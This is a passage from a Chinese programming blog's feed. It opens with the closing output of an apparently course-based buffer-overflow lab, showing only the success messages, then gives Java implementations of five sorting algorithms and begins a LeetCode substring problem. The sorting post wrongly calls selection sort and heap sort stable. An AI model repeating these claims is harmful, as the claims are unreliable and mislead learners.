class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">Keep going</span><br><span class="line">Type string:KABOOM!: getbufn returned 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>完结撒花 _(:3」∠❀)__菊花碎了一地</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0-查看cookie&quot;&gt;&lt;a href=&quot;#0-查看cookie&quot; class=&quot;headerlink&quot; title=&quot;0. 查看cookie&quot;&gt;&lt;/a&gt;&lt;strong&gt;0. 查看cookie&lt;/strong&gt;&lt;/h1&gt; &lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="湖南大学" scheme="http://example.com/tags/%E6%B9%96%E5%8D%97%E5%A4%A7%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>一篇博客解决常见的排序</title>
    <link href="http://example.com/2022/09/08/%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F/"/>
    <id>http://example.com/2022/09/08/%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2%E8%A7%A3%E5%86%B3%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F/</id>
    <published>2022-09-08T14:20:47.000Z</published>
    <updated>2022-09-08T15:13:01.506Z</updated>
    
    <content type="html"><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p><img src="https://img-blog.csdnimg.cn/493e3f19c18f4940a19041cc9ff75f56.gif#pic_center" alt="在这里插入图片描述"></p><p>遍历n次数组，如果当前数比后一个数大则将当前<br>数与后一个数交换位置，每遍历一次可排好一个数<br>的位置，直到n次，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BubbleSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] bubbleSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; ints.length-i; j++) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[j];</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;ints[j-<span class="number">1</span>])&#123;</span><br><span class="line">                    ints[j] = ints[j-<span class="number">1</span>];</span><br><span class="line">                    ints[j-<span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">BubbleSort</span>().bubbleSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p><img src="https://img-blog.csdnimg.cn/a60a023b7dee45209a255cbb569f5ffa.gif#pic_center" alt="在这里插入图片描述"></p><p>遍历数组，每一次遍历都会从当前位置之后寻找最小的数，并记录最小数的位置，然后将当前值和最小值交换，完整遍历后可以得到一个顺序列表，时间复杂度为O（N2），排序满足稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SelectionSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] selectionSort(<span class="type">int</span>[] ints)&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">first</span> <span class="operator">=</span> ints[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> first;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i+<span class="number">1</span>; j &lt; ints.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[j]&lt;tmp)&#123;</span><br><span class="line">                    tmp = ints[j];</span><br><span class="line">                    index = j;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[i] = ints[index];</span><br><span class="line">            ints[index] = first;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SelectionSort</span>().selectionSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p><img src="https://img-blog.csdnimg.cn/4f3f096c237b4d85b50e0e39fcc28b03.gif#pic_center" alt="在这里插入图片描述"></p><p>每次排序前先选择一个基准数，然后把比基准数小的放左边，比基准书大的放右边，具体方法是用两个指针，一个从左到右，一个从右到左，左指针找到比基准数大的数时，将左指针的数和右指针的数交换，然后右指针开始向左找比基准书小的数，找到后和左指针的数交换，直到两个指针相遇，此时数组被分成两个区域，再对这两个区域进行快排递归，直到所有数都排好为止<br>时间复杂度为O(nlogn),在最坏的情况下为O(N2),且不能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">QuickSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] quickSort(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> right)&#123;</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">baseNum</span> <span class="operator">=</span> ints[left];</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> right;</span><br><span class="line">            <span class="keyword">while</span> (l&lt;r)&#123;</span><br><span class="line">                <span class="keyword">while</span> (ints[r]&gt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[l] = ints[r];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span> (ints[l]&lt;=baseNum&amp;&amp;l&lt;r)&#123;</span><br><span class="line">                    l++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (l&lt;r)&#123;</span><br><span class="line">                    ints[r] = ints[l];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ints[l] = baseNum;</span><br><span class="line">            quickSort(ints,left, r-<span class="number">1</span>);</span><br><span class="line">            quickSort(ints,l+<span class="number">1</span>,right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">2</span>,<span class="number">5</span>,<span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">QuickSort</span>().quickSort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p><img src="https://img-blog.csdnimg.cn/0417393bd8fc45eb80d6938896c9cf4d.gif#pic_center" alt="在这里插入图片描述"></p><p>分治的思想，先将整个数组一分为二，再二分为四……直到分成一个部分只有一个元素为止，这是分的思想。将分出来的部分合并为一个有序的部分，两个已经排好序的部分合并就比较容易了，每一次只需要比较头元素的大小，然后选择小的那个加入到中间数组里即可，用递归的方法可以很好的实现这个思想<br>时间复杂度稳定为O(nlogn),并且能保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MergeSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sort</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line">        <span class="type">int</span>[] tmp = <span class="keyword">new</span> <span class="title class_">int</span>[ints.length];</span><br><span class="line">        <span class="keyword">if</span> (left&lt;right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> (left+right)/<span class="number">2</span>;</span><br><span class="line">            sort(ints,left,mid);</span><br><span class="line">            sort(ints,mid+<span class="number">1</span>,right);</span><br><span class="line">            merge(ints,left,mid,right,tmp);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> left,<span class="type">int</span> mid,<span class="type">int</span> right,<span class="type">int</span>[] tmp)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> left;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> mid+<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l&lt;=mid||r&lt;=right)&#123;</span><br><span class="line">            <span class="keyword">if</span> (l&gt;mid)&#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (r&gt;right)&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ints[l]&lt;ints[r])&#123;</span><br><span class="line">                tmp[index++] = ints[l++];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                tmp[index++] = ints[r++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> left; i &lt;= right; i++) &#123;</span><br><span class="line">            ints[i] = tmp[index++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">8</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">7</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">MergeSort</span>().sort(ints,<span class="number">0</span>,ints.length-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="https://img-blog.csdnimg.cn/2a8e4c9efa1847c4a43a6448b1371bc7.gif#pic_center" alt="在这里插入图片描述"></p><p>将数据重新排列成一个最小堆，即每个结点的父节点都小于其子结点，这样顶部的元素一定是当前堆的最小值，将顶部元素取出并将叶子结点放置到顶部元素，这样操作后可能会破坏最小堆的结构，所以此时需要重新生成最小堆，这样又可以得出这个堆的最小值，这样重复操作，直到所有数都被取出<br>时间复杂度稳定为O(nlogn),并且保证稳定性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HeapSort</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span>[] ints)</span>&#123;</span><br><span class="line">        <span class="comment">//形成最小堆</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> ints.length-<span class="number">1</span>; i &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">            <span class="comment">//只有一个子结点且为左子结点</span></span><br><span class="line">            <span class="keyword">if</span> (i%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> i/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">if</span> (ints[father]&gt;ints[i])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[i];</span><br><span class="line">                    ints[i] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">father</span> <span class="operator">=</span> (i-<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?ints[i]:ints[i-<span class="number">1</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[i]&lt;ints[i-<span class="number">1</span>]?i:i-<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[father])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[father];</span><br><span class="line">                    ints[father] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                    arrange(ints,smallIndex, ints.length);</span><br><span class="line">                &#125;</span><br><span class="line">                i-=<span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">lastIndex</span> <span class="operator">=</span> ints.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[lastIndex];</span><br><span class="line">            ints[lastIndex--] = ints[<span class="number">0</span>];</span><br><span class="line">            ints[<span class="number">0</span>] = tmp;</span><br><span class="line">            arrange(ints,<span class="number">0</span>,lastIndex+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">arrange</span><span class="params">(<span class="type">int</span>[] ints,<span class="type">int</span> index,<span class="type">int</span> intsLength)</span>&#123;</span><br><span class="line">        <span class="type">int</span> leftChildIndex;</span><br><span class="line">        <span class="type">int</span> rightChildIndex;</span><br><span class="line">        <span class="comment">//判断有无左子节点</span></span><br><span class="line">        <span class="keyword">if</span> (index*<span class="number">2</span>+<span class="number">1</span>&lt;intsLength)&#123;</span><br><span class="line">            leftChildIndex = index*<span class="number">2</span>+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//有两个结点的情况</span></span><br><span class="line">            <span class="keyword">if</span> ((index+<span class="number">1</span>)*<span class="number">2</span>&lt;intsLength)&#123;</span><br><span class="line">                rightChildIndex = (index+<span class="number">1</span>)*<span class="number">2</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">small</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?ints[leftChildIndex]:ints[rightChildIndex];</span><br><span class="line">                <span class="type">int</span> <span class="variable">smallIndex</span> <span class="operator">=</span> ints[leftChildIndex]&lt;ints[rightChildIndex]?leftChildIndex:rightChildIndex;</span><br><span class="line">                <span class="keyword">if</span> (small&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[smallIndex];</span><br><span class="line">                    ints[smallIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">                arrange(ints,smallIndex,intsLength);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//只有一个子节点的情况</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (ints[leftChildIndex]&lt;ints[index])&#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> ints[index];</span><br><span class="line">                    ints[index] = ints[leftChildIndex];</span><br><span class="line">                    ints[leftChildIndex] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] ints = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>&#125;;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">HeapSort</span>().heapSort(ints);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ints.length; i++) &#123;</span><br><span class="line">            System.out.println(ints[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;排序&quot;&gt;&lt;a href=&quot;#排序&quot; class=&quot;headerlink&quot; title=&quot;排序&quot;&gt;&lt;/a&gt;排序&lt;/h2&gt;&lt;h3 id=&quot;冒泡排序&quot;&gt;&lt;a href=&quot;#冒泡排序&quot; class=&quot;headerlink&quot; title=&quot;冒泡排序&quot;&gt;&lt;/a&gt;冒泡排序&lt;/h</summary>
      
    
    
    
    
    <category term="排序" scheme="http://example.com/tags/%E6%8E%92%E5%BA%8F/"/>
    
  </entry>
  
  <entry>
    <title>最长无重复子序列</title>
    <link href="http://example.com/2022/03/10/%E6%9C%80%E9%95%BF%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%90%E5%BA%8F%E5%88%97/"/>
    <id>http://example.com/2022/03/10/%E6%9C%80%E9%95%BF%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%90%E5%BA%8F%E5%88%97/</id>
    <published>2022-03-10T13:52:18.000Z</published>
    <updated>2022-09-08T15:14:21.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h1><pre><code>这是我的第一个算法题记录，以后都会以这种形式记录下来</code></pre><p>刷力扣其实是我很早之前就想做的了，大一的时候有段时间有这样的兴致，但也只是刷了几道题就没坚持了，以前也有遇到过那种很有趣的题，可惜没有记录，现在回去再做一次又感觉不值了。所以现在我尽量把那些有意思的题记录一下，也算是当做自己的一种积累吧。</p><p>这次突然开始刷力扣也算因为，哈哈哈，马上要笔试了，临时抱佛脚而已，做这道题也花了我一个小时，刚开始是思路有了，奈何没有正确的方法去实现，真正笔试的时候时间早过了。。。</p><hr><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><strong>无重复字符的最长子串</strong><br>给定一个字符串 s ，请你找出其中不含有重复字符的 最长子串 的长度。</p><p>示例 1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;abcabcbb&quot;</span><br><span class="line">输出: 3 </span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">输入: s = &quot;bbbbb&quot;</span><br><span class="line">输出: 1</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;b&quot;，所以其长度为 1。</span><br></pre></td></tr></table></figure><p>示例 3:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入: s = &quot;pwwkew&quot;</span><br><span class="line">输出: 3</span><br><span class="line">解释: 因为无重复字符的最长子串是 &quot;wke&quot;，所以其长度为 3。</span><br><span class="line">     请注意，你的答案必须是 子串 的长度，&quot;pwke&quot; 是一个子序列，不是子串。</span><br></pre></td></tr></table></figure><p>提示：</p><ul><li>0 &lt;= s.length &lt;= 5 * 104</li><li>s 由英文字母、数字、符号和空格组成</li></ul><hr><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>最开始想到的是暴力解，但是肯定是不给过的，果断放弃<br>在给字符编号的时候发现，可以将相同字符的指标记录下来，然后按照1，2，3，4….这样的顺序来取字符，如果遇到相同的字符就将其替换掉，并去除之前的数</p><p>比如：abcabcbb<br>a的指标有</p><ul><li>a:0,3</li><li>b:1,4,6,7</li><li>c:2,5</li></ul><p>接着开始从最开始编号</p><table><thead><tr><th align="left">0</th><th align="center">1</th><th align="right">2</th></tr></thead><tbody><tr><td align="left">a</td><td align="center">b</td><td align="right">c</td></tr></tbody></table><p>编到3的时候发现重复,此时去除第一组键值对接着往下排以此类推，直到最后一个元素</p><table><thead><tr><th align="left"><del>0</del></th><th align="center">1</th><th align="right">2</th><th align="right">3</th></tr></thead><tbody><tr><td align="left"><del>a</del></td><td align="center">b</td><td align="right">c</td><td align="right">a</td></tr></tbody></table><table><thead><tr><th align="left"><del>0</del></th><th align="center"><del>1</del></th><th align="right">2</th><th align="right">3</th><th align="right">4</th></tr></thead><tbody><tr><td align="left"><del>a</del></td><td align="center"><del>b</del></td><td align="right">c</td><td align="right">a</td><td align="right">b</td></tr><tr><td align="left">……</td><td align="center"></td><td align="right"></td><td align="right"></td><td align="right"></td></tr></tbody></table><p>太巧了，这正是一个可排序的哈希表可以解决的问题，但不幸的是，Java自带的LinkedHashMap没有删除首元素这个方法，寄！<br>或许它是有的但是我不会用，更寄！<br>所以我就自己写了一个类似linkedhashmap但是带删除首元素的方法</p><hr><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 